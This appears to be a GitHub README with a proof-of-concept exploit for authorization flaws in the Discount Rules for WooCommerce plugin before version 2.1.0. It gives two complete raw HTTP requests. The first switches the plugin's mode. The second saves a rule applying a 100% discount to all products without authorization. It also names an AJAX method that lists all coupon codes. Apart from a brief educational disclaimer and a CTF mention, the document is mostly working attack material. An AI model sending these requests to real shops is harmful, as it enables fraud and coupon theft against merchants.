# Multiple-vulnerabilities-woo-discount-rules-2.1.0-PoC
Proof-of-Concept for Discount Rules for WooCommerce &lt; 2.1.0 authorization issues



May be useful in CTF because it's very old.

## Info
The vulnerability makes it possible to send requests to set up discounts and receive coupons without authorization.
More details here: https://patchstack.com/articles/multiple-vulnerabilities-in-discount-rules-for-woocommerce-plugin/

Most interesting AJAX methods are:
- wdr_ajax_cart_coupon - Retrieve the list of all coupon codes
- wdr_ajax_save_rule - Save a discount rule

## Usage
### Firstly, we need to send a request to enable the second version of the vulnerable plugin:
```
POST /?awdr_switch_plugin_to=v2 HTTP/1.1
Host: wp.example.com
Content-Length: 0
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://wp.example.com
Referer: http://wp.example.com/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ru;q=0.8
Cookie: wordpress_test_cookie=WP+Cookie+check; woocommerce_items_in_cart=1; wp_woocommerce_session_40ae737bee04d7f05dfc6771baa425d6=878fc0c71d51694db644a581fd114f1b%7C%7C1698923490%7C%7C1698919890%7C%7Cbe0053b07e3673f00828a41bbb399000; woocommerce_cart_hash=75a9c8b0a8eb0d3560d5d875dbbdeb45
Connection: close
```
You can make sure that the version has been changed by searching for the answer to this request for the phrase “v2”; it should find several occurrences, but nothing will be found for the phrase “v1”.
![set_and_check_version_to_v2](https://github.com/fromkhabar/Multiple-vulnerabilities-woo-discount-rules-2.1.0-PoC/assets/158577109/4ca44344-dac2-4406-a892-39c70374212a)


### Now we are able to set any discount on all products
- enabled=1 - turn on discount
- filters[1][type]=all_products - to all products
- product_adjustments[type]=percentage - percent discount
- product_adjustments[value]=100 - discount value
```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: wp.example.com
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9,ru;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 409

title=eeeee&enabled=1&current_page=1&discount_type=wdr_simple_discount&action=wdr_ajax&method=save_rule&awdr_nonce=2daef3dee8&wdr_save_close=1&edit_rule=&filters%5B1%5D%5Btype%5D=all_products&product_adjustments%5Btype%5D=percentage&product_adjustments%5Bvalue%5D=100&product_adjustments%5Bcart_label%5D=&additional%5Bcondition_relationship%5D=and&usage_limits=&date_from=&date_to=&wdr_ajax_select2=121bf69698
```
![set_discount](https://github.com/fromkhabar/Multiple-vulnerabilities-woo-discount-rules-2.1.0-PoC/assets/158577109/b39b4286-bf56-4f86-b08f-0379e69b7155)


Vuln was fixed in version 2.1.0

# Disclamer
This PoC is only meant for educational purposes. You are responsible for your own actions.
